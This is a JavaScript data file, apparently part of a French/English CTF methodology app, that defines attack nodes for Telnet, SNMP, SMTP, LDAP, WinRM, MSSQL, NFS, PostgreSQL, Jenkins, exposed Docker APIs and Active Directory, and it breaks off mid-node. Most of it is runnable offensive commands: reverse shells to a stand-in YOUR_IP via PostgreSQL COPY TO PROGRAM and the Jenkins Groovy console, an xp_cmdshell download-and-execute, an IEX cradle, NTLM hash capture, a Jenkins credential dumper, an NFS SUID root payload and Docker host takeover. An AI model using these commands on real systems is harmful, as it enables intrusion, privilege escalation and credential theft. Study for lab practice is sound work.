// ─── Extension CTF Bible — Nœuds avancés ──────────────────────────────────────
// Basé sur l'analyse des writeups HTB (Meow/Fawn/Dancing/Redeemer)
// + techniques intermédiaires/avancées manquantes

Object.assign(NODES, {

  // ── TELNET (Meow → aller plus loin) ──────────────────────────────────────────
  "telnet_enum": {
    id: "telnet_enum", title: "Telnet Énumération", title_en: "Telnet Enumeration", category: "network", icon: "📟",
    description: "Telnet (port 23) transmet tout en clair. Credential par défaut très fréquents. Présent dans les équipements réseau anciens, IoT, certaines boxes HTB.",
    description_en: "Telnet (port 23) transmits everything in plaintext. Default credentials are very common. Found on legacy network equipment, IoT devices, and some HTB machines.",
    commands: [
      { label: "Banner grabbing", label_en: "Banner grabbing", cmd: "nc -nv TARGET_IP 23\ntelnet TARGET_IP" },
      { label: "Credentials par défaut à tester", label_en: "Default credentials to try", cmd: "root: (vide)\nadmin:admin\nadmin:(vide)\nroot:root\nadmin:password\nadmin:1234\nguest:guest" },
      { label: "Nmap — détection et scripts Telnet", label_en: "Nmap — detection and Telnet scripts", cmd: "nmap -sV -p 23 --script telnet-ntlm-info,telnet-encryption TARGET_IP" },
      { label: "Hydra brute force Telnet", label_en: "Hydra brute force Telnet", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP" },
      { label: "Si équipement réseau (Cisco, etc.)", label_en: "Network device (Cisco, etc.)", cmd: "# Credentials Cisco par défaut :\n# cisco:cisco | admin:cisco | enable:cisco\ntelnet TARGET_IP\n> enable\nPassword: cisco" }
    ],
    lookfor: [
      "Banner : quel OS/device est derrière ?",
      "Login avec root:vide ou admin:admin (très fréquent HTB Starting Point)",
      "Équipement réseau → Cisco, Juniper ont des creds par défaut connus"
    ],
    lookfor_en: [
      "Banner: what OS/device is behind?",
      "Login with root:empty or admin:admin (very common on HTB Starting Point)",
      "Network equipment → Cisco, Juniper have known default credentials"
    ],
    tips: [
      "Telnet = tout en clair → si tu peux sniffer le réseau, capture les credentials avec Wireshark",
      "HTB Starting Point : toujours essayer root sans mot de passe en premier",
      "Si équipement réseau : chercher les creds constructeur sur defaultpassword.de"
    ],
    tips_en: [
      "Telnet = cleartext → if you can sniff the network, capture credentials with Wireshark",
      "HTB Starting Point: always try root with no password first",
      "For network equipment: look up vendor default credentials on defaultpassword.de"
    ],
    choices: [
      { label: "Login root/admin sans mot de passe → shell obtenu", label_en: "Root/admin login without password → shell obtained", next: "shell_stabilize", icon: "✅" },
      { label: "Brute force → credentials trouvés", label_en: "Brute force → credentials found", next: "shell_stabilize", icon: "🔨" }
    ]
  },

  // ── SNMP (énumération réseau avancée) ─────────────────────────────────────────
  "snmp_enum": {
    id: "snmp_enum", title: "SNMP Énumération (port 161 UDP)", title_en: "SNMP Enumeration (port 161 UDP)", category: "network", icon: "📡",
    description: "SNMP v1/v2 avec community string 'public' expose une quantité massive d'informations : utilisateurs, processus, ports ouverts, routes, configs. Souvent oublié car UDP.",
    description_en: "SNMP v1/v2 with community string 'public' exposes a massive amount of information: users, processes, open ports, routes, configs. Often overlooked because it uses UDP.",
    commands: [
      { label: "Détecter SNMP", label_en: "Detect SNMP", cmd: "sudo nmap -sU -p 161 --script snmp-info TARGET_IP\nonesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt TARGET_IP" },
      { label: "Énumération complète avec snmpwalk", label_en: "Full enumeration with snmpwalk", cmd: "snmpwalk -v2c -c public TARGET_IP\nsnmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # processus" },
      { label: "snmp-check — output lisible", label_en: "snmp-check — readable output", cmd: "snmp-check -t TARGET_IP -c public" },
      { label: "Brute force community strings", label_en: "Brute force community strings", cmd: "onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt TARGET_IP" },
      { label: "OIDs importants", label_en: "Important OIDs", cmd: "# Utilisateurs système :\nsnmpwalk -v1 -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25\n# Ports TCP ouverts :\nsnmpwalk -v1 -c public TARGET_IP 1.3.6.1.2.1.6.13.1.3\n# Processus en cours :\nsnmpwalk -v1 -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2\n# Logiciels installés :\nsnmpwalk -v1 -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2" }
    ],
    lookfor: [
      "Community string 'public' accessible = mine d'or d'informations",
      "Noms d'utilisateurs système → cibles pour brute force SSH/SMB",
      "Ports internes non visibles depuis l'extérieur",
      "Version logicielle exacte → CVEs",
      "SNMP v3 : authentification requise, moins d'info"
    ],
    lookfor_en: [
      "Community string 'public' accessible = goldmine of information",
      "System usernames → targets for SSH/SMB brute force",
      "Internal ports not visible from outside",
      "Exact software version → CVEs",
      "SNMP v3: authentication required, less info exposed"
    ],
    tips: [
      "SNMP est UDP → souvent oublié dans les scans TCP. Toujours scanner avec -sU",
      "Community string 'private' permet parfois l'écriture de config",
      "Les usernames extraits de SNMP → les tester en SSH/SMB/FTP"
    ],
    tips_en: [
      "SNMP is UDP → often missed in TCP-only scans. Always scan with -sU",
      "Community string 'private' sometimes allows writing to the config",
      "Usernames extracted from SNMP → test them against SSH/SMB/FTP"
    ],
    choices: [
      { label: "Utilisateurs système récupérés → brute force SSH", label_en: "System users retrieved → SSH brute force", next: "ssh_brute", icon: "🔐" },
      { label: "Version logicielle avec CVE trouvée", label_en: "Software version with CVE found", next: "exploit_searchsploit", icon: "💥" },
      { label: "Credentials dans les processus/config", label_en: "Credentials found in processes/config", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ── SMTP ──────────────────────────────────────────────────────────────────────
  "smtp_enum": {
    id: "smtp_enum", title: "SMTP Énumération (port 25/587)", title_en: "SMTP Enumeration (port 25/587)", category: "network", icon: "📧",
    description: "Les serveurs SMTP mal configurés permettent l'énumération d'utilisateurs valides (VRFY/EXPN/RCPT TO) et parfois le relayage de mails non autorisé.",
    description_en: "Misconfigured SMTP servers allow enumeration of valid users (VRFY/EXPN/RCPT TO) and sometimes unauthorized mail relaying.",
    commands: [
      { label: "Banner grabbing + commandes manuelles", label_en: "Banner grabbing + manual commands", cmd: "nc -nv TARGET_IP 25\n# EHLO test → liste les extensions\n# VRFY root → vérifie si l'user existe\n# EXPN staff → liste les membres d'un alias" },
      { label: "Nmap scripts SMTP", label_en: "Nmap SMTP scripts", cmd: "nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay TARGET_IP" },
      { label: "smtp-user-enum — énumération massive", label_en: "smtp-user-enum — bulk enumeration", cmd: "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t TARGET_IP\nsmtp-user-enum -M RCPT -U users.txt -t TARGET_IP" },
      { label: "Test open relay", label_en: "Open relay test", cmd: "# Connexion manuelle :\ntelnet TARGET_IP 25\nHELO attacker.com\nMAIL FROM: fake@attacker.com\nRCPT TO: victim@external.com\nDATA\nTest open relay\n.\nQUIT" },
      { label: "SWAKS — test SMTP avancé", label_en: "SWAKS — advanced SMTP test", cmd: "swaks --to admin@TARGET --from test@test.com --server TARGET_IP" }
    ],
    lookfor: [
      "VRFY/EXPN activé → énumération d'utilisateurs",
      "Open relay → envoyer des mails en se faisant passer pour n'importe qui",
      "Authentification SMTP → tenter brute force",
      "Version du serveur : Postfix, Exim, Sendmail → chercher CVEs"
    ],
    lookfor_en: [
      "VRFY/EXPN enabled → user enumeration",
      "Open relay → send mail impersonating anyone",
      "SMTP authentication → attempt brute force",
      "Server version: Postfix, Exim, Sendmail → look for CVEs"
    ],
    tips: [
      "Les usernames SMTP sont souvent les mêmes que SSH/FTP",
      "Exim 4.87-4.91 → CVE-2019-10149 (command injection) → RCE",
      "SMTP + PHPMailer vulnérable → RCE via injection de paramètre"
    ],
    tips_en: [
      "SMTP usernames are often the same as SSH/FTP accounts",
      "Exim 4.87-4.91 → CVE-2019-10149 (command injection) → RCE",
      "SMTP + vulnerable PHPMailer → RCE via parameter injection"
    ],
    choices: [
      { label: "Utilisateurs énumérés → brute force SSH/autre", label_en: "Users enumerated → SSH/other brute force", next: "ssh_brute", icon: "🔐" },
      { label: "Exim/Postfix version vulnérable → exploit", label_en: "Vulnerable Exim/Postfix version → exploit", next: "exploit_searchsploit", icon: "💥" },
      { label: "Open relay utilisable pour phishing interne", label_en: "Open relay usable for internal phishing", next: "credentials_found", icon: "🎣" }
    ]
  },

  // ── LDAP (Active Directory entry point) ──────────────────────────────────────
  "ldap_enum": {
    id: "ldap_enum", title: "LDAP Énumération (port 389/636)", title_en: "LDAP Enumeration (port 389/636)", category: "network", icon: "🗂️",
    description: "LDAP expose la structure Active Directory. Anonymous bind souvent actif → énumération complète sans credentials : users, groupes, GPOs, politiques de mot de passe.",
    description_en: "LDAP exposes the Active Directory structure. Anonymous bind is often enabled → full enumeration without credentials: users, groups, GPOs, password policies.",
    commands: [
      { label: "Nmap scripts LDAP", label_en: "Nmap LDAP scripts", cmd: "nmap -p 389 --script ldap-rootdse,ldap-search TARGET_IP" },
      { label: "Anonymous bind — lister la racine", label_en: "Anonymous bind — list root", cmd: "ldapsearch -x -H ldap://TARGET_IP -b '' -s base\nldapsearch -x -H ldap://TARGET_IP -b 'DC=domain,DC=local'" },
      { label: "Lister tous les utilisateurs AD", label_en: "List all AD users", cmd: "ldapsearch -x -H ldap://TARGET_IP -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName\nldapsearch -x -H ldap://TARGET_IP -b 'DC=domain,DC=local' '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))'" },
      { label: "ldapdomaindump — rapport HTML complet", label_en: "ldapdomaindump — full HTML report", cmd: "ldapdomaindump TARGET_IP -u 'DOMAIN\\USER' -p PASSWORD -o ./ldap_dump/" },
      { label: "Chercher mots de passe dans la description", label_en: "Search for passwords in description field", cmd: "ldapsearch -x -H ldap://TARGET_IP -b 'DC=domain,DC=local' '(objectClass=user)' description\n# Les admins laissent parfois le mot de passe dans la description !" }
    ],
    lookfor: [
      "Anonymous bind accepté = tout le domaine lisible",
      "Mot de passe dans l'attribut 'description' (très courant en CTF)",
      "Comptes avec 'DONT_REQUIRE_PREAUTH' → ASREPRoasting",
      "SPNs → Kerberoasting",
      "Groupes : Domain Admins, Enterprise Admins, Account Operators"
    ],
    lookfor_en: [
      "Anonymous bind accepted = entire domain readable",
      "Password in the 'description' attribute (very common in CTF)",
      "Accounts with 'DONT_REQUIRE_PREAUTH' → ASREPRoasting",
      "SPNs → Kerberoasting",
      "Groups: Domain Admins, Enterprise Admins, Account Operators"
    ],
    tips: [
      "Toujours tenter l'anonymous bind en premier",
      "ldapdomaindump génère des rapports HTML très lisibles",
      "Les descriptions LDAP cachent souvent le mot de passe initial ou des infos sensibles"
    ],
    tips_en: [
      "Always try anonymous bind first",
      "ldapdomaindump generates very readable HTML reports",
      "LDAP descriptions often hide the initial password or sensitive info"
    ],
    choices: [
      { label: "Credentials dans description/attributs LDAP", label_en: "Credentials in LDAP description/attributes", next: "credentials_found", icon: "🏆" },
      { label: "Utilisateurs AD énumérés → AS-REP Roasting", label_en: "AD users enumerated → AS-REP Roasting", next: "asreproasting", icon: "🎟️" },
      { label: "SPNs trouvés → Kerberoasting", label_en: "SPNs found → Kerberoasting", next: "kerberoasting", icon: "🎟️" },
      { label: "Énumération complète → BloodHound", label_en: "Full enumeration → BloodHound", next: "bloodhound", icon: "🐕" }
    ]
  },

  // ── WinRM ─────────────────────────────────────────────────────────────────────
  "winrm_enum": {
    id: "winrm_enum", title: "WinRM (port 5985/5986)", title_en: "WinRM (port 5985/5986)", category: "network", icon: "🪟",
    description: "Windows Remote Management = PowerShell distant. Si credentials valides et droits Remote Management Users → shell PowerShell via evil-winrm.",
    description_en: "Windows Remote Management = remote PowerShell. With valid credentials and Remote Management Users rights → PowerShell shell via evil-winrm.",
    commands: [
      { label: "Vérifier si WinRM est ouvert", label_en: "Check if WinRM is open", cmd: "nmap -p 5985,5986 TARGET_IP\ncrackmapexec winrm TARGET_IP" },
      { label: "Tester credentials avec crackmapexec", label_en: "Test credentials with crackmapexec", cmd: "crackmapexec winrm TARGET_IP -u USER -p PASSWORD\ncrackmapexec winrm TARGET_IP -u users.txt -p passwords.txt" },
      { label: "Se connecter avec evil-winrm", label_en: "Connect with evil-winrm", cmd: "evil-winrm -i TARGET_IP -u USER -p PASSWORD\nevil-winrm -i TARGET_IP -u USER -H NTLM_HASH  # pass-the-hash" },
      { label: "Upload/download de fichiers", label_en: "Upload/download files", cmd: "# Dans evil-winrm :\nupload /local/linpeas.exe C:\\Users\\Public\\lp.exe\ndownload C:\\Users\\admin\\secret.txt" },
      { label: "Charger des modules PowerShell", label_en: "Load PowerShell modules", cmd: "# Dans evil-winrm :\nIEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerView.ps1')" }
    ],
    lookfor: [
      "Port 5985 ouvert + credentials valides = shell garanti",
      "L'utilisateur doit être dans 'Remote Management Users' ou admin local",
      "(Pwn3d!) dans crackmapexec = droits admin"
    ],
    lookfor_en: [
      "Port 5985 open + valid credentials = guaranteed shell",
      "User must be in 'Remote Management Users' or local admin",
      "(Pwn3d!) in crackmapexec = admin rights"
    ],
    tips: [
      "5985 = HTTP, 5986 = HTTPS (certificat auto-signé → evil-winrm -S -c cert.pem -k key.pem)",
      "evil-winrm supporte le pass-the-hash directement avec -H",
      "Si port 5985 fermé mais 5986 ouvert → forcer HTTPS avec evil-winrm -S"
    ],
    tips_en: [
      "5985 = HTTP, 5986 = HTTPS (self-signed cert → evil-winrm -S -c cert.pem -k key.pem)",
      "evil-winrm supports pass-the-hash directly with -H",
      "If port 5985 is closed but 5986 is open → force HTTPS with evil-winrm -S"
    ],
    choices: [
      { label: "Shell PowerShell obtenu → énumération", label_en: "PowerShell shell obtained → enumeration", next: "shell_windows", icon: "✅" },
      { label: "Credentials à tester", label_en: "Credentials to test", next: "credentials_found", icon: "🔑" }
    ]
  },

  // ── MSSQL ─────────────────────────────────────────────────────────────────────
  "mssql_enum": {
    id: "mssql_enum", title: "MSSQL Énumération (port 1433)", title_en: "MSSQL Enumeration (port 1433)", category: "network", icon: "🗄️",
    description: "Microsoft SQL Server. Sa (System Administrator) sans mot de passe très fréquent. xp_cmdshell permet RCE directement depuis SQL si activé.",
    description_en: "Microsoft SQL Server. The sa (System Administrator) account with no password is very common. xp_cmdshell enables direct RCE from SQL if enabled.",
    commands: [
      { label: "Nmap scripts MSSQL", label_en: "Nmap MSSQL scripts", cmd: "nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password TARGET_IP" },
      { label: "Connexion avec impacket-mssqlclient", label_en: "Connect with impacket-mssqlclient", cmd: "impacket-mssqlclient sa@TARGET_IP\nimpacket-mssqlclient DOMAIN/USER:PASSWORD@TARGET_IP -windows-auth" },
      { label: "Connexion avec sqsh ou sqlcmd", label_en: "Connect with sqsh or sqlcmd", cmd: "sqsh -S TARGET_IP -U sa -P ''\nsqlcmd -S TARGET_IP -U sa -P '' -Q 'SELECT @@version'" },
      { label: "Activer xp_cmdshell (si désactivé)", label_en: "Enable xp_cmdshell (if disabled)", cmd: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" },
      { label: "RCE via xp_cmdshell", label_en: "RCE via xp_cmdshell", cmd: "EXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest http://YOUR_IP/shell.exe -OutFile C:\\Windows\\Temp\\s.exe; C:\\Windows\\Temp\\s.exe\"';" },
      { label: "Lire fichiers locaux via OPENROWSET", label_en: "Read local files via OPENROWSET", cmd: "SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS data;" },
      { label: "Steal NTLM hash via xp_dirtree", label_en: "Steal NTLM hash via xp_dirtree", cmd: "# Lancer Responder d'abord\nEXEC xp_dirtree '\\\\YOUR_IP\\share';" }
    ],
    lookfor: [
      "sa avec mot de passe vide ou 'sa' (très fréquent)",
      "xp_cmdshell activé → RCE immédiat",
      "Service account MSSQL dans quels groupes ? → privesc",
      "Version MSSQL → CVEs spécifiques"
    ],
    lookfor_en: [
      "sa with empty password or 'sa' (very common)",
      "xp_cmdshell enabled → immediate RCE",
      "Which groups is the MSSQL service account in? → privesc",
      "MSSQL version → specific CVEs"
    ],
    tips: [
      "xp_dirtree force une authentification NTLM vers votre Responder → capture hash",
      "Si sa sans mot de passe : PowerUpSQL pour énumération automatique",
      "MSSQL tourne souvent en LocalSystem ou domaine service → privesc direct"
    ],
    tips_en: [
      "xp_dirtree forces NTLM authentication toward your Responder → captures hash",
      "If sa has no password: PowerUpSQL for automated enumeration",
      "MSSQL often runs as LocalSystem or a domain service account → direct privesc"
    ],
    choices: [
      { label: "xp_cmdshell → RCE obtenu", label_en: "xp_cmdshell → RCE obtained", next: "rce_found", icon: "💥" },
      { label: "NTLM hash capturé via Responder", label_en: "NTLM hash captured via Responder", next: "smb_ntlm_capture", icon: "🎣" },
      { label: "Credentials SA trouvés ailleurs", label_en: "SA credentials found elsewhere", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ── NFS ───────────────────────────────────────────────────────────────────────
  "nfs_enum": {
    id: "nfs_enum", title: "NFS Énumération (port 2049)", title_en: "NFS Enumeration (port 2049)", category: "network", icon: "📂",
    description: "Network File System : partages réseau Unix. Si no_root_squash → on peut créer un binaire SUID en tant que root local et l'exécuter sur la cible.",
    description_en: "Network File System: Unix network shares. If no_root_squash → you can create a SUID binary as local root and execute it on the target.",
    commands: [
      { label: "Lister les exports NFS", label_en: "List NFS exports", cmd: "showmount -e TARGET_IP\nnmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs TARGET_IP" },
      { label: "Monter le partage NFS", label_en: "Mount the NFS share", cmd: "sudo mkdir /mnt/nfs\nsudo mount -t nfs TARGET_IP:/EXPORT_PATH /mnt/nfs -o nolock\nls -la /mnt/nfs" },
      { label: "Vérifier les options (no_root_squash ?)", label_en: "Check options (no_root_squash?)", cmd: "# Vérifier sur la cible :\ncat /etc/exports\n# no_root_squash = dangereux → root local = root sur le partage" },
      { label: "Exploitation no_root_squash → PrivEsc", label_en: "Exploit no_root_squash → PrivEsc", cmd: "# Sur votre machine (vous êtes root localement) :\ncp /bin/bash /mnt/nfs/bash\nchmod +s /mnt/nfs/bash  # SUID root car vous êtes root\n# Sur la cible :\n/mnt_nfs_path/bash -p  # shell root !" },
      { label: "Alternative : créer un exécutable SUID", label_en: "Alternative: create a SUID executable", cmd: "# Créer evil.c :\ncat > evil.c << 'EOF'\n#include <stdlib.h>\nint main() { setuid(0); system(\"/bin/bash\"); return 0; }\nEOF\ngcc evil.c -o /mnt/nfs/evil\nchmod +s /mnt/nfs/evil" }
    ],
    lookfor: [
      "Exports accessibles sans authentification",
      "Option no_root_squash dans /etc/exports (dangereux !)",
      "Fichiers de configuration sensibles dans le partage",
      "Clés SSH ou credentials dans les répertoires montés"
    ],
    lookfor_en: [
      "Exports accessible without authentication",
      "no_root_squash option in /etc/exports (dangerous!)",
      "Sensitive config files in the share",
      "SSH keys or credentials in mounted directories"
    ],
    tips: [
      "no_root_squash = le root de votre machine = root sur le partage → SUID trivial",
      "root_squash (par défaut) = le root est remappé à nfsnobody → moins dangereux",
      "Chercher aussi des fichiers .ssh/authorized_keys pour ajouter votre clé publique"
    ],
    tips_en: [
      "no_root_squash = your local root = root on the share → trivial SUID escalation",
      "root_squash (default) = root is remapped to nfsnobody → less dangerous",
      "Also look for .ssh/authorized_keys files to add your public key"
    ],
    choices: [
      { label: "no_root_squash → SUID créé → root sur cible", label_en: "no_root_squash → SUID created → root on target", next: "root_obtained", icon: "👑" },
      { label: "Fichiers sensibles dans le partage", label_en: "Sensitive files found in the share", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ── PostgreSQL ────────────────────────────────────────────────────────────────
  "postgresql_enum": {
    id: "postgresql_enum", title: "PostgreSQL Énumération (port 5432)", title_en: "PostgreSQL Enumeration (port 5432)", category: "network", icon: "🐘",
    description: "PostgreSQL peut permettre RCE via COPY TO/FROM PROGRAM si l'utilisateur est superuser.",
    description_en: "PostgreSQL can allow RCE via COPY TO/FROM PROGRAM if the user is a superuser.",
    commands: [
      { label: "Connexion basique", label_en: "Basic connection", cmd: "psql -h TARGET_IP -U postgres\npsql -h TARGET_IP -U postgres -p 5432 -c '\\l'" },
      { label: "Nmap scripts PostgreSQL", label_en: "Nmap PostgreSQL scripts", cmd: "nmap -p 5432 --script pgsql-brute TARGET_IP" },
      { label: "RCE via COPY TO PROGRAM (superuser)", label_en: "RCE via COPY TO PROGRAM (superuser)", cmd: "psql -h TARGET_IP -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt'\";\npsql -h TARGET_IP -U postgres -c \"COPY (SELECT '') TO PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\\\"'\";" },
      { label: "Lire des fichiers locaux", label_en: "Read local files", cmd: "CREATE TABLE temp(data text);\nCOPY temp FROM '/etc/passwd';\nSELECT * FROM temp;" }
    ],
    lookfor: ["Connexion sans mot de passe", "Utilisateur postgres avec superuser", "Version → CVEs"],
    lookfor_en: ["Connection without password", "postgres user with superuser role", "Version → CVEs"],
    tips: ["PostgreSQL 9.3+ : COPY TO PROGRAM = RCE si superuser", "metasploit : use auxiliary/scanner/postgres/postgres_login"],
    tips_en: ["PostgreSQL 9.3+: COPY TO PROGRAM = RCE if superuser", "Metasploit: use auxiliary/scanner/postgres/postgres_login"],
    choices: [
      { label: "RCE via COPY TO PROGRAM", label_en: "RCE via COPY TO PROGRAM", next: "rce_found", icon: "💥" },
      { label: "Credentials trouvés dans les tables", label_en: "Credentials found in tables", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ── Jenkins ───────────────────────────────────────────────────────────────────
  "jenkins_rce": {
    id: "jenkins_rce", title: "Jenkins RCE (port 8080)", title_en: "Jenkins RCE (port 8080)", category: "web", icon: "🔧",
    description: "Jenkins exposé sans auth ou avec credentials faibles → RCE via la console Groovy Script. Très fréquent en CTF.",
    description_en: "Jenkins exposed without auth or with weak credentials → RCE via the Groovy Script console. Very common in CTF.",
    commands: [
      { label: "Accès et reconnaissance", label_en: "Access and reconnaissance", cmd: "# Accéder à http://TARGET:8080\n# Chercher : /script (console Groovy)\n# Checker : /asynchPeople (liste users)\n# Checker : Jenkins CLI accessible" },
      { label: "RCE via Script Console (Groovy)", label_en: "RCE via Script Console (Groovy)", cmd: "# http://TARGET:8080/script\ndef cmd = 'id'.execute()\nprintln cmd.text\n\n# Reverse shell :\ndef cmd2 = ['bash', '-c', 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'].execute()" },
      { label: "RCE via Job Build", label_en: "RCE via Job Build", cmd: "# Créer un nouveau job Freestyle\n# Build > Execute shell :\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n# Lancer le build" },
      { label: "Credentials dans Jenkins", label_en: "Credentials in Jenkins", cmd: "# /credentials/ pour lister\n# Script console pour dumper :\nimport com.cloudbees.plugins.credentials.*\nimport com.cloudbees.plugins.credentials.impl.*\nfor (c in CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials)) {\n  println(c.username + ':' + c.password)\n}" },
      { label: "CVE-2024-23897 — LFI Jenkins (< 2.441)", label_en: "CVE-2024-23897 — Jenkins LFI (< 2.441)", cmd: "# Jenkins CLI vulnerable\njava -jar jenkins-cli.jar -s http://TARGET:8080/ help '@/etc/passwd'" }
    ],
    lookfor: [
      "Console script /script accessible sans auth",
      "Login admin:admin ou admin:password",
      "Jenkins version < 2.441 → CVE-2024-23897 (LFI sans auth)",
      "CVE-2019-1003000 → RCE sans auth (< 2.138)"
    ],
    lookfor_en: [
      "Script console /script accessible without auth",
      "Login admin:admin or admin:password",
      "Jenkins version < 2.441 → CVE-2024-23897 (unauthenticated LFI)",
      "CVE-2019-1003000 → unauthenticated RCE (< 2.138)"
    ],
    tips: [
      "La console Groovy est un RCE direct si accessible — priorité absolue",
      "Les builds Jenkins tournent souvent en root ou avec des droits élevés",
      "Credentials stockés dans Jenkins : souvent clés SSH pour d'autres serveurs"
    ],
    tips_en: [
      "The Groovy console is a direct RCE if accessible — top priority",
      "Jenkins builds often run as root or with elevated privileges",
      "Credentials stored in Jenkins: often SSH keys to other servers"
    ],
    choices: [
      { label: "Console Groovy accessible → RCE", label_en: "Groovy console accessible → RCE", next: "rce_found", icon: "💥" },
      { label: "Credentials extraits de Jenkins", label_en: "Credentials extracted from Jenkins", next: "credentials_found", icon: "🏆" },
      { label: "LFI via CLI (CVE-2024-23897)", label_en: "LFI via CLI (CVE-2024-23897)", next: "web_lfi_found", icon: "📂" }
    ]
  },

  // ── Docker API exposé ─────────────────────────────────────────────────────────
  "docker_api_exposed": {
    id: "docker_api_exposed", title: "Docker API Exposée (port 2375)", title_en: "Exposed Docker API (port 2375)", category: "exploit", icon: "🐳",
    description: "L'API Docker sans TLS sur le port 2375 = root sur le serveur hôte. Permet de créer des conteneurs montant le filesystem hôte.",
    description_en: "Docker API without TLS on port 2375 = root on the host server. Allows creating containers that mount the host filesystem.",
    commands: [
      { label: "Vérifier si l'API est accessible", label_en: "Check if the API is accessible", cmd: "curl http://TARGET_IP:2375/version\ncurl http://TARGET_IP:2375/containers/json" },
      { label: "Lister les images disponibles", label_en: "List available images", cmd: "curl http://TARGET_IP:2375/images/json | python3 -m json.tool" },
      { label: "Créer un conteneur avec montage /", label_en: "Create a container mounting /", cmd: "# Créer le conteneur\ncurl -X POST http://TARGET_IP:2375/containers/create \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host\"}],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' " },
      { label: "Via docker client directement", label_en: "Via docker client directly", cmd: "DOCKER_HOST=tcp://TARGET_IP:2375 docker ps\nDOCKER_HOST=tcp://TARGET_IP:2375 docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
      { label: "Ajouter clé SSH dans authorized_keys hôte", label_en: "Add SSH key to host authorized_keys", cmd: "DOCKER_HOST=tcp://TARGET_IP:2375 docker run -v /:/mnt --rm alpine sh -c 'echo YOUR_SSH_PUBKEY >> /mnt/root/.ssh/authorized_keys'" }
    ],
    lookfor: ["Port 2375 ouvert et accessible = accès root garanti", "Port 2376 = Docker avec TLS (besoin de certificats)"],
    lookfor_en: ["Port 2375 open and accessible = guaranteed root access", "Port 2376 = Docker with TLS (certificates required)"],
    tips: [
      "Docker API exposée = une des vulnérabilités les plus critiques en infrastrucure",
      "Chercher aussi /var/run/docker.sock sur des cibles où vous êtes dans un conteneur"
    ],
    tips_en: [
      "Exposed Docker API = one of the most critical infrastructure vulnerabilities",
      "Also look for /var/run/docker.sock on targets where you are inside a container"
    ],
    choices: [
      { label: "Accès root sur l'hôte via conteneur", label_en: "Root access on host via container", next: "root_obtained", icon: "👑" }
    ]
  },

  // ── ACTIVE DIRECTORY — Section complète ──────────────────────────────────────
  "ad_initial": {
    id: "ad_initial", title: "Active Directory — Point d'Entrée", title_en: "Active Directory — Entry Point", category: "network", icon: "🏰",
    description: "Environnement Active Directory détecté. Méthodologie d'attaque AD complète : énumération → attaques Kerberos → mouvement latéral → DA.",
    description_en: "Active Directory environment detected. Full AD attack methodology: enumeration → Kerberos attacks → lateral movement → Domain Admin.",
    commands: [
      { label: "Énumération initiale sans credentials", label_en: "Initial enumeration without credentials", cmd: "# Identifier le domaine\nnmap -p 88,389,445,3268 TARGET_IP\n# Port 88 = Kerberos = Domain Controller\ncrackmapexec smb TARGET_IP  # donne domaine, hostname, OS" },
      { label: "Récupérer le domaine et DC", label_en: "Retrieve domain and DC", cmd: "crackmapexec smb TARGET_IP\n# Ou depuis nmap :\nnmap -sV --script smb-security-mode,smb-os-discovery TARGET_IP" },
      { label: "Enum4linux-ng — énumération complète", label_en: "Enum4linux-ng — full enumeration", cmd: "enum4linux-ng -A TARGET_IP\nenum4linux-ng -A TARGET_IP -u USER -p PASS" },
      { label: "Modifier /etc/hosts avec le domaine", label_en: "Update /etc/hosts with the domain", cmd: "echo 'TARGET_IP DOMAIN.LOCAL DC01.DOMAIN.LOCAL' >> /etc/hosts" },
      { label: "RPC anonymous — lister users/groupes", label_en: "Anonymous RPC — list users/groups", cmd: "rpcclient -U '' -N TARGET_IP\n> enumdomusers\n> enumdomgroups\n> querydominfo" }
    ],
    lookfor: [
      "Nom du domaine (DOMAIN.LOCAL)",
      "Hostname du DC (DC01, ADDC, etc.)",
      "Utilisateurs via null session ou anonymous bind",
      "Politique de mots de passe (lockout threshold)"
    ],
    lookfor_en: [
      "Domain name (DOMAIN.LOCAL)",
      "DC hostname (DC01, ADDC, etc.)",
      "Users via null session or anonymous bind",
      "Password policy (lockout threshold)"
    ],
    tips: [
      "Port 88 ouvert = Kerberos = vous êtes face à un DC",
      "Toujours noter le domaine exact dans /etc/hosts pour les attaques Kerberos",
      "Commencer sans credentials (null session) puis progresser"
    ],
    tips_en: [
      "Port 88 open = Kerberos = you are facing a DC",
      "Always add the exact domain to /etc/hosts for Kerberos attacks",
      "Start without credentials (null session) then escalate"
    ],
    choices: [
      { label: "Null session → utilisateurs énumérés", label_en: "Null session → users enumerated", next: "ad_user_enum", icon: "👥" },
      { label: "Credentials AD obtenus → aller plus loin", label_en: "AD credentials obtained → go further", next: "bloodhound", icon: "🐕" },
      { label: "ASREPRoasting sans credentials", label_en: "ASREPRoasting without credentials", next: "asreproasting", icon: "🎟️" },
